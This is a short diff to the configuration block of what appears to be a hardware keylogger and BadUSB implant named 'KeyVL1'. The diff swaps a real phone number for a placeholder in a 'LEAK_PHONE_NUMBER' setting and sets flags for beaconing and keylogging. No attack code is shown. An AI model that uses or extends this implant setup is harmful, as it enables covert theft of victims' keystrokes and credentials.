@@ -6,7 +6,7 @@
 /*******************************************/
 /******* START CONFIGURATION OPTIONS *******/
 /*******************************************/
-#define LEAK_PHONE_NUMBER "+34670555355"		// Introduce the destination phone number with country code
+#define LEAK_PHONE_NUMBER "+34nnnnnn"		// Introduce the destination phone number with country code
 #define IMPLANT_NAME "KeyVL1"	         			// Identify device when multiple used			
 #define BEACON true                         // Un-comment to send beacons every BEACON_TIME 
 #define KEYLOGGER true                      // Un-comment to work also as keylogger (if commented, just work as badusb)
